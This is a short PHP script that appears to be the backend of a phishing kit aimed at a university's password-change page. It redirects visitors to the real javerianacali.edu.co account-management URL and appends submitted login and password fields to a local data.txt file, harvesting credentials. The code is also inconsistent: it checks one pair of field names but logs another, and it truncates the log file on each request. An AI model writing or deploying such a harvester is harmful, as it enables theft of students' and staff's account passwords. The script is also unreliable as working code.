<?php
header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/modificarContrasena/VALIDAR');
$txt = "data.txt";
$fh = fopen($txt, 'w+');
if (isset($_POST['login']) && isset($_POST['password'])) { // check if both fields are set
   $txt=$_POST['field1'].' - '.$_POST['field2'];
   file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
   exit();
}
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
 
?>
